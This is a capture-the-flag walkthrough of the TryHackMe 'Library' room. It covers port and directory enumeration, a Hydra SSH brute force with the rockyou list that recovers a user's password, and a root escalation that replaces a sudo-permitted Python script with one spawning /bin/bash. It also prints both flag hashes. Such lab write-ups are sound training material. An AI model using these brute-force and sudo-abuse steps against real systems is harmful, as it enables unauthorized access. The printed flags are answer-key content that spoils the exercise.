## Library - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/bsidesgtlibrary)

**IP: 10.10.99.178**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Nmap, Gobuster, Hydra

**Author**: <br>

mauzware aka mauzinho <br>
[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap and Gobuster.

  ```
  nmap -Pn -sC -sV -T5 -p- 10.10.99.178

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
  |   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
  |_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  | http-robots.txt: 1 disallowed entry 
  |_/
  |_http-title: Welcome to  Blog - Library Machine
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```
  
  ```
  gobuster dir -u http://10.10.99.178/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /images               (Status: 301) [Size: 313] [--> http://10.10.99.178/images/]
  /server-status        (Status: 403) [Size: 300]
  Progress: 220560 / 220561 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- When I visited a web page, I tried to post a comment but it was not reflected. Users that commented on the page: meliodas, root, www-data and Anonymous.
  
- I checked `robots.txt` it gave me `rockyou` which means I can most likely use it to obtain credentials.

  ```
  User-agent: rockyou 
  Disallow: /
  ```

---

## ⚙️ Gaining Access

- I tried to gain access by uploading shells to `/images` but it wass unsuccessfull, then I switched to brute forcing since I have 4 usernames and port 22 open. I started with `meliodas` first.

  ```
  hydra -l meliodas -P /rockyou.txt -t 16 10.10.99.178 ssh
  [22][ssh] host: 10.10.99.178   login: meliodas   password: iloveyou1
  1 of 1 target successfully completed, 1 valid password found

  ```
  
- Nice, credentials obtained! Log in as meliodas with ssh and start looking for flags.

---

## 🧍 User Privilege Escalation

- First flag is there as soon as you log in.

  ```
  meliodas@ubuntu:~$ whoami
  meliodas
  
  meliodas@ubuntu:~$ ls
  bak.py  user.txt
  
  meliodas@ubuntu:~$ cat user.txt 
  6d488cbb3f111d135722c33cb635f4ec
  ```
  
- Moving to privilege escalation.

---

## 👑 Root Privilege Escalation

- With `sudo -l` I found that I have sudo permission with using Python, this is the way to root for sure, no need for further enumeration.

  ```
  meliodas@ubuntu:~$ sudo -l
  Matching Defaults entries for meliodas on ubuntu:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User meliodas may run the following commands on ubuntu:
      (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
  ```
  
- OK, so here I tried few different things to manipulate `os module` in `bak.py` script but couldn't make it work. When I tried to edit the script I got denied, so then I though "What if I delete this script and create a new one?". Well, that actually worked!

  ```rm -f bak.py```
  
- Now, since original script is deleted, create a new one named `bak.py` and run it with sudo and full paths, othervise it won't work.

  ```
  meliodas@ubuntu:~$ nano bak.py
  meliodas@ubuntu:~$ cat bak.py 
  import os
  os.system("/bin/bash")
  
  meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py 
  root@ubuntu:~# whoami
  root
  ```

- That's it, root obtained, now just read the flag. Keep in mind, there's few different lines of code for this 'shell' that will give you root access, try experimenting a bit!

  ```
  root@ubuntu:~# cat /root/root.txt
  e8c8c6c256c35515d1d344ee0488c617
  ```

---

## 🏁 Flags

- **User Flag**: `6d488cbb3f111d135722c33cb635f4ec`
- **Root Flag**: `e8c8c6c256c35515d1d344ee0488c617`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding way to root with Python.`

- What did I learn?
  `New privilege escalation.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
